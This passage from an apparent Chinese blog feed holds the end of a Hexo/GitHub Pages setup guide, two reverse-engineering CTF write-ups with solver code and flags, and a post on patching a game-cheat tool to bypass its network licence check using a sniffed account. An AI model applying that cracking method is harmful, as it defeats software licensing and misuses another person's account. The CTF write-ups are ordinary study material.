href="https://i.loli.net/2018/07/15/5b4b600080cec.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b600080cec.jpg" class="lazyload"></a></p><p>新建一个，title随意填，key粘贴刚刚的就行</p><p>四  测试</p><p>可以输入下面的命令，看看设置是否成功，<a href="mailto:git@github.com">git@github.com</a>的部分不要修改：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure></div><p>如果是下面的反馈：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The authenticity of host &#39;github.com (206.7.277.239)&#39; can&#39;t be established.</span><br><span class="line">RSA key fingerprint is 16:27:ac:a5:76:28:27:36:63:1b:56:7d:eb:df:a6:48.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no)?</span><br></pre></td></tr></table></figure></div><p>输入yes就好，然后会看到：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi usename! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure></div><p>SSH Key就配置成功了</p><h2 id="5-将本地的Hexo文件更新到Github的库中"><a href="#5-将本地的Hexo文件更新到Github的库中" class="headerlink" title="5. 将本地的Hexo文件更新到Github的库中"></a>5. 将本地的Hexo文件更新到Github的库中</h2><p>登录Github打开自己的项目 username.github.io</p><p>打开后，复制链接<br><a href="https://i.loli.net/2018/07/15/5b4b60009434e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b60009434e.jpg" class="lazyload"></a></p><p>打开你一开始创建的Hexo文件夹（如F:\Blog\Hexo），用记事本打开刚文件夹下的_config.yml文件<br><a href="https://i.loli.net/2018/07/15/5b4b6000a84ee.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6000a84ee.jpg" class="lazyload"></a></p><p>在配置文件里，应该是最下面，像我一样，repository就填你复制的链接<br><a href="https://i.loli.net/2018/07/15/5b4b6000bf071.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6000bf071.jpg" class="lazyload"></a></p><h1 id="注意！！！"><a href="#注意！！！" class="headerlink" title="注意！！！"></a><strong>注意！！！</strong></h1><p>yml文件里的格式非常严格，双引号空一格再写，记得所有设置参数属性末尾都要加空格，输符号的时候输入法一定是英文</p><p>然后在Hexo文件夹下右键，Git Bash</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">或直接</span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure></div><p>执行完之后会让你输入github的账号和密码，输入完后就可以登录我们自己的部署在Github Pages服务器上的博客了。对应的地址是 username.github.io</p><p>在浏览器上输入自己的主页地址即可看到我们自己的博客</p><h1 id="美化"><a href="#美化" class="headerlink" title="美化"></a><strong>美化</strong></h1><h2 id="1-进入Hexo的官网主题专栏https-hexo-io-themes"><a href="#1-进入Hexo的官网主题专栏https-hexo-io-themes" class="headerlink" title="1. 进入Hexo的官网主题专栏https://hexo.io/themes/"></a>1. 进入Hexo的官网主题专栏<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></h2><p>可以看到有很多主题给我们选，我们只要选择喜欢的主题点击进去，然后进入到它的github地址，我们只要把这个地址复制下来</p><p>我选择的是hexo-theme-next</p><p>再打开Hexo文件夹下的themes目录（F:\Blog\hexo\themes），右键Git Bash，在命令行输入:</p><pre><code>git clone https://github.com/iissnan/hexo-theme-next(此处地址替换成你需要使用的主题的地址) </code></pre><p>等待下载完成</p><h2 id="2-修改Hexo配置文件"><a href="#2-修改Hexo配置文件" class="headerlink" title="2. 修改Hexo配置文件"></a>2. 修改Hexo配置文件</h2><p>下载完成后，打开Hexo文件夹下的配置文件_config.yml<br>修改参数为：theme: hexo-theme-next</p><h2 id="3-部署主题，本地查看效果"><a href="#3-部署主题，本地查看效果" class="headerlink" title="3. 部署主题，本地查看效果"></a>3. 部署主题，本地查看效果</h2><p>返回Hexo目录，右键Git Bash，输入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure></div><p>打开浏览器，输入 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 即可看见我们的主题已经更换了。</p><p>如果效果满意，将它部署到Github上<br>打开Hexo文件夹，右键Git Bash，输入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean   (必须要，不然有时因为缓存问题，服务器更新不了主题)</span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure></div><p>打开自己的主页，即可看到修改后的效果</p><p>Next主题说明<br><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">http://theme-next.iissnan.com/</a><br><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">https://hexo.io/zh-cn/</a><br><a href="https://github.com/iissnan/hexo-theme-next/blob/master/README.cn.md" target="_blank" rel="noopener">https://github.com/iissnan/hexo-theme-next/blob/master/README.cn.md</a></p><h2 id="如何更改内容区域的宽度？"><a href="#如何更改内容区域的宽度？" class="headerlink" title="如何更改内容区域的宽度？"></a>如何更改内容区域的宽度？</h2><p>编辑主题（我的是NexT文件夹下）的 source/css/_variables/custom.styl 文件</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$main-desktop                   &#x3D; 75%</span><br><span class="line">$content-desktop                &#x3D; calc(100% - 252px)</span><br></pre></td></tr></table></figure></div><p>建议这个比例，亲测好用</p><h1 id="写文档"><a href="#写文档" class="headerlink" title="写文档"></a><strong>写文档</strong></h1><h2 id="一、用hexo发表新文章"><a href="#一、用hexo发表新文章" class="headerlink" title="一、用hexo发表新文章"></a>一、用hexo发表新文章</h2><pre><code>$ hexo n &quot;文章标题&quot; </code></pre><p>会在项目 \Hexo\source_posts 中生成md文件，用编辑器打开编写即可。</p><p>也可以直接在\Hexo\source_posts中新建一个md文件，写完后，推送到服务器上，执行以下命令即可在我们的站点看到新的文章。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure></div><h2 id="二、用Markdown写文章"><a href="#二、用Markdown写文章" class="headerlink" title="二、用Markdown写文章"></a>二、用Markdown写文章</h2><p>在 \Hexo\source_posts 文件夹下存放着我们的文章，它们的格式是以.md格式结尾的<br>我们可以使用支持Markdown语法的编辑器进行文章编译，然后保存文件到 \Hexo\source_posts 文件夹下即可。</p><p>复制进去之后，只要执行</p><pre><code>$ hexo d -g </code></pre><p>推送到我们的Github仓库即可</p><h1 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h1><h2 id="添加「分类」页面"><a href="#添加「分类」页面" class="headerlink" title="添加「分类」页面"></a>添加「分类」页面</h2><p>在终端窗口下，定位到 Hexo 站点目录下。使用 hexo new page 新建一个页面，命名为 categories ：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd your-hexo-site</span><br><span class="line">$ hexo new page categories</span><br></pre></td></tr></table></figure></div><p>编辑刚新建的index.md，将页面的 type 设置为 categories ，主题将自动为这个页面显示分类。页面内容如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title: 分类</span><br><span class="line">date: 2014-12-22 12:39:04</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure></div><p>在菜单中添加链接。编辑 主题配置文件(主题的_config.yml文件里) ， 添加 categories 到 menu 中，如下:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: &#x2F;</span><br><span class="line">  archives: &#x2F;archives</span><br><span class="line">  categories: &#x2F;categories</span><br></pre></td></tr></table></figure></div><p>即可，标签与此类似</p><p>在md文件中，在文档头部填入如下格式即可自动实现分类，标签等</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章名 （无空格）</span><br><span class="line">date: 2013-05-29 07:56:29 #发表日期（无空格）</span><br><span class="line">categories:（空一格）</span><br><span class="line">- 一级类别 （无空格）</span><br><span class="line">- 二级类别（无空格）  #文章分类</span><br><span class="line">tags: [博客，文章，随笔] （无空格）     #文章标签，可以一次添加多个标签</span><br></pre></td></tr></table></figure></div><p>同样注意符号和空格</p><hr><h2 id="好了，这样，一个完整的博客就搭好了，如果你按此完成了你的博客，congratulations！"><a href="#好了，这样，一个完整的博客就搭好了，如果你按此完成了你的博客，congratulations！" class="headerlink" title="好了，这样，一个完整的博客就搭好了，如果你按此完成了你的博客，congratulations！"></a>好了，这样，一个完整的博客就搭好了，如果你按此完成了你的博客，congratulations！</h2><h2 id="不如请我喝瓶水怎么样2333"><a href="#不如请我喝瓶水怎么样2333" class="headerlink" title="不如请我喝瓶水怎么样2333"></a>不如请我喝瓶水怎么样2333</h2><p>————————————————————————————— 2018/2/1 22:12:49 </p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h3 id=&quot;终于搭好了。。。顺便把以前写的34篇导了进来，写一下搭建过程吧，感觉如果熟练的话半小时就足够了。。。&quot;&gt;&lt;a href=&quot;#终于搭好了。。。顺便把以前写的34篇导了进来，写一下搭建过程吧，感觉如果熟练的话半小时就足够了。。。&quot;</summary>
        
      
    
    
    
    <category term="blog搭建" scheme="https://kabeor.github.io/categories/blog%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="blog搭建" scheme="https://kabeor.github.io/tags/blog%E6%90%AD%E5%BB%BA/"/>
    
    <category term="Hexo" scheme="https://kabeor.github.io/tags/Hexo/"/>
    
    <category term="GitPage" scheme="https://kabeor.github.io/tags/GitPage/"/>
    
  </entry>
  
  <entry>
    <title>JCTF2014    RE200</title>
    <link href="https://kabeor.github.io/JCTF2014%20%20%20%20RE200/"/>
    <id>https://kabeor.github.io/JCTF2014%20%20%20%20RE200/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:44:32.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JCTF2014-RE200"><a href="#JCTF2014-RE200" class="headerlink" title="JCTF2014    RE200"></a>JCTF2014    RE200</h1><p>下载后的文件PE头有问题，放入WinHex<br><a href="https://i.loli.net/2018/07/15/5b4b668de093e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b668de093e.jpg" class="lazyload"></a></p><p>DOS头的最后一个参数应该是指向PE头的位移，所以应该是E8，而PE头的起始位应该是50 45 00 00</p><p>修改以后保存，放入OD中，搜素字符串： </p><p>可以看到有个success应该就是成功的跳转</p><p>IDA打开</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以发现，要求输入9个数字，分别为v30-v38。 </span><br><span class="line">要求：</span><br><span class="line"></span><br><span class="line">v31 * v32 * v30 &#x2F; 11 &#x3D;&#x3D;106</span><br><span class="line">(v31 ^ v30) &#x3D;&#x3D; v32 - 4</span><br><span class="line">(v32 + v31+ v30)%100 &#x3D;&#x3D;34</span><br><span class="line">v33&#x3D;&#x3D;80</span><br><span class="line">v34&#x3D;&#x3D;94</span><br><span class="line">v35&#x3D;&#x3D;98</span><br></pre></td></tr></table></figure></div><p>但是只需要前面三个数进行一个运算,满足相关条件,中间三个数为80 94 98,最后三个数无关,然后打印出flag只取前面三个数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main( int argc, char *argv[] )</span><br><span class="line">&#123;</span><br><span class="line">    for ( size_t i &#x3D; 0; i &lt; 0x100000; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        for ( size_t j &#x3D; 0; j &lt; 0x100000; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">            size_t k &#x3D; (i ^ j) + 4;</span><br><span class="line">            if ( i * j * k &#x2F; 0xb &#x3D;&#x3D; 0x6a &amp;&amp; (i + j + k) % 100 &#x3D;&#x3D; 0x22 )</span><br><span class="line">            &#123;</span><br><span class="line">                printf( &quot;%d %d %d\n&quot;, i, j, k );</span><br><span class="line">                &#x2F;&#x2F; return 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>15 6 13这一组是正确解</p><p>flag为</p><p>jlflag{15613abc}</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;JCTF2014-RE200&quot;&gt;&lt;a href=&quot;#JCTF2014-RE200&quot; class=&quot;headerlink&quot; title=&quot;JCTF2014    RE200&quot;&gt;&lt;/a&gt;JCTF2014   </summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋Reverse赛题" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8BReverse%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
    <category term="CTF" scheme="https://kabeor.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Snert-2018春季淘汰赛Reverse WriteUp</title>
    <link href="https://kabeor.github.io/Snert-2018%E6%98%A5%E5%AD%A3%E6%B7%98%E6%B1%B0%E8%B5%9BReverse%20WriteUp/"/>
    <id>https://kabeor.github.io/Snert-2018%E6%98%A5%E5%AD%A3%E6%B7%98%E6%B1%B0%E8%B5%9BReverse%20WriteUp/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:49:34.855Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RE100"><a href="#RE100" class="headerlink" title="RE100"></a>RE100</h1><p>这题越看越熟悉，原来做过，i春秋的那篇wp就是我写的hhh</p><p>链接   <a href="https://www.ichunqiu.com/writeup/detail/597" target="_blank" rel="noopener">第三届上海市大学生网络安全大赛crackme</a></p><h1 id="RE500"><a href="#RE500" class="headerlink" title="RE500"></a>RE500</h1><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>无壳<br><a href="https://i.loli.net/2018/07/15/5b4b691611d8e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b691611d8e.jpg" class="lazyload"></a></p><h2 id="IDA反编译"><a href="#IDA反编译" class="headerlink" title="IDA反编译"></a>IDA反编译</h2><p>运行发现，随意输入会弹出fail，此题应该是算法题，于是拖入IDA，shift+F12搜索字符串fail<br><a href="https://i.loli.net/2018/07/15/5b4b691627470.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b691627470.jpg" class="lazyload"></a><br>只有一个，于是跟进去<br><a href="https://i.loli.net/2018/07/15/5b4b69163b61b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b69163b61b.jpg" class="lazyload"></a><br>发现这里就是主要算法部分了</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>这个程序的伪代码竟然是标准的C++</p><p>我们可以明显注意到名称空间Sudu<br><a href="https://i.loli.net/2018/07/15/5b4b69165345d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b69165345d.jpg" class="lazyload"></a></p><p>黄标可以看出有三个函数，分别是</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Sudu::Sudu</span><br><span class="line">Sudu::set_data</span><br><span class="line">Sudu::check</span><br></pre></td></tr></table></figure></div><p>根据他们的位置判断，这些就是主要函数了</p><h3 id="Sudu-Sudu方法"><a href="#Sudu-Sudu方法" class="headerlink" title="Sudu::Sudu方法"></a>Sudu::Sudu方法</h3><p>进入后看到，这里是用来初始化的，把所有字符初始化为零<br><a href="https://i.loli.net/2018/07/15/5b4b6916687c7.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6916687c7.jpg" class="lazyload"></a></p><h3 id="Sudu-set-data方法"><a href="#Sudu-set-data方法" class="headerlink" title="Sudu::set_data方法"></a>Sudu::set_data方法</h3><p><a href="https://i.loli.net/2018/07/15/5b4b69167cacc.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b69167cacc.jpg" class="lazyload"></a><br>这里明显是创建一个9x9的表，然后把this中的数字按顺序填进去<br>this就是外面的<em>data_start_</em><br><a href="https://i.loli.net/2018/07/15/5b4b6916921c7.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6916921c7.jpg" class="lazyload"></a><br>里面数字具体如下（太长了，只截取一部分）<br><a href="https://i.loli.net/2018/07/15/5b4b6916a58e3.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6916a58e3.jpg" class="lazyload"></a><br>按序填入后如下</p><pre><code>0 0 7 5 0 0 0 6 00 2 0 0 1 0 0 0 79 0 0 0 3 0 4 0 02 0 1 0 0 0 0 0 00 3 0 1 0 0 0 0 50 0 0 0 0 0 7 1 04 0 0 0 0 8 2 0 00 0 5 9 0 0 0 8 00 8 0 0 0 1 0 0 3</code></pre><h3 id="Sudu-check方法"><a href="#Sudu-check方法" class="headerlink" title="Sudu::check方法"></a>Sudu::check方法</h3><p>最后来看check这个方法，这个方法是判断决定输出是否成功的，返回1则success，内部如下<br><a href="https://i.loli.net/2018/07/15/5b4b6916b9f5e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6916b9f5e.jpg" class="lazyload"></a><br>又是三个方法分别为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sudu::check_block    &#x2F;&#x2F;块</span><br><span class="line">Sudu::check_col      &#x2F;&#x2F;列</span><br><span class="line">Sudu::check_row      &#x2F;&#x2F;行</span><br></pre></td></tr></table></figure></div><p>根据单词意思就很好理解了，它们以&amp;&amp;连接，所以必须同时为1才行</p><h4 id="check-block方法"><a href="#check-block方法" class="headerlink" title="check_block方法"></a>check_block方法</h4><p><a href="https://i.loli.net/2018/07/15/5b4b6925eebf8.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6925eebf8.jpg" class="lazyload"></a><br>先初始化v2，再对每个3x3的块做遍历，判断是否每个块里的数字各不相同</p><h4 id="check-col方法"><a href="#check-col方法" class="headerlink" title="check_col方法"></a>check_col方法</h4><p><a href="https://i.loli.net/2018/07/15/5b4b69260f1a5.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b69260f1a5.jpg" class="lazyload"></a><br>检查每列数字是否相同</p><h4 id="check-row方法"><a href="#check-row方法" class="headerlink" title="check_row方法"></a>check_row方法</h4><p><a href="https://i.loli.net/2018/07/15/5b4b69262153d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b69262153d.jpg" class="lazyload"></a><br>同样的，检测每行数字是否相同</p><h2 id="还有一个坑"><a href="#还有一个坑" class="headerlink" title="还有一个坑"></a>还有一个坑</h2><p>我们没有注意到，在if中有个set_sudu函数，进去看看<br><a href="https://i.loli.net/2018/07/15/5b4b692633b93.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b692633b93.jpg" class="lazyload"></a></p><p>很长，但我们只需要看主要的if，这里有个Sudu::number方法，再进去<br><a href="https://i.loli.net/2018/07/15/5b4b69264722c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b69264722c.jpg" class="lazyload"></a><br>这里<br>a1是我们要输入的字符串<br>this=v10/9<br>a3=v10%9<br>a4=v8-48<br>a5=v5</p><p>判断表中的值是否为0，把原来给的值全设为0</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>数独太难，直接放网站解<br><a href="http://shudu.gwalker.cn/" target="_blank" rel="noopener">http://shudu.gwalker.cn/</a><br><a href="https://i.loli.net/2018/07/15/5b4b69265b70e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b69265b70e.jpg" class="lazyload"></a></p><p>flag{340089102508406930016207058060875349709064820854392006093650071170023604602740590}</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;RE100&quot;&gt;&lt;a href=&quot;#RE100&quot; class=&quot;headerlink&quot; title=&quot;RE100&quot;&gt;&lt;/a&gt;RE100&lt;/h1&gt;&lt;p&gt;这题越看越熟悉，原来做过，i春秋的那篇wp就是我写的hhh&lt;/p&gt;
&lt;p&gt;链接   &lt;a</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋Reverse赛题" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8BReverse%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="逆向，i春秋" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8Ci%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>对新版本的某游戏辅助带vmp制作山寨补丁</title>
    <link href="https://kabeor.github.io/%E5%AF%B9%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E5%B8%A6vmp%E5%88%B6%E4%BD%9C%E5%B1%B1%E5%AF%A8%E8%A1%A5%E4%B8%81/"/>
    <id>https://kabeor.github.io/%E5%AF%B9%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E5%B8%A6vmp%E5%88%B6%E4%BD%9C%E5%B1%B1%E5%AF%A8%E8%A1%A5%E4%B8%81/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:31:49.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对新版本的某游戏辅助带vmp制作山寨补丁"><a href="#对新版本的某游戏辅助带vmp制作山寨补丁" class="headerlink" title="对新版本的某游戏辅助带vmp制作山寨补丁"></a>对新版本的某游戏辅助带vmp制作山寨补丁</h1><p>还是上次那人写的辣鸡辅助，这次是最新版的，拿来看看<br>上篇链接<br><a href="https://kabeor.github.io/%E5%AF%B9%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E7%9A%84%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/">对某游戏辅助的网络验证破解</a></p><h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p><a href="https://i.loli.net/2018/07/15/5b4b61f6b0e05.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b61f6b0e05.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/15/5b4b61f72b183.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b61f72b183.jpg" class="lazyload"></a></p><p>这次加了个vmp的壳，不过我们打补丁就行</p><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>就不放图了，还是拿sniff抓，还是那人的号，上一篇提过</p><p>这次不采用二进制修改的方法，我们只需要用补丁将易游验证的号换成我们自己的</p><h1 id="补丁制作"><a href="#补丁制作" class="headerlink" title="补丁制作"></a>补丁制作</h1><p>我们使用XH补丁制作工具<br><a href="https://i.loli.net/2018/07/15/5b4b61f7763af.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b61f7763af.jpg" class="lazyload"></a></p><p>首先我们需要原始的账号，就是下面这个<br><a href="https://i.loli.net/2018/07/15/5b4b61f85f097.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b61f85f097.jpg" class="lazyload"></a></p><p>把/后面的那一串转换为16进制，粘贴进原始特征，再把我们自己的也转换为16进制，粘贴进目标数据。</p><p>点击上面Inline Hook，双击CreateWindowExa函数，<br><a href="https://i.loli.net/2018/07/15/5b4b61f921bcc.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b61f921bcc.jpg" class="lazyload"></a><br>其他可以自己设置，然后回去点生成补丁即可</p><p><a href="https://i.loli.net/2018/07/15/5b4b61f94a491.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b61f94a491.jpg" class="lazyload"></a></p><h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><p>这辣鸡辅助这回能进去了，进游戏跳伞就封七天，幸亏我不玩这神仙游戏了</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;对新版本的某游戏辅助带vmp制作山寨补丁&quot;&gt;&lt;a href=&quot;#对新版本的某游戏辅助带vmp制作山寨补丁&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="破解" scheme="https://kabeor.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
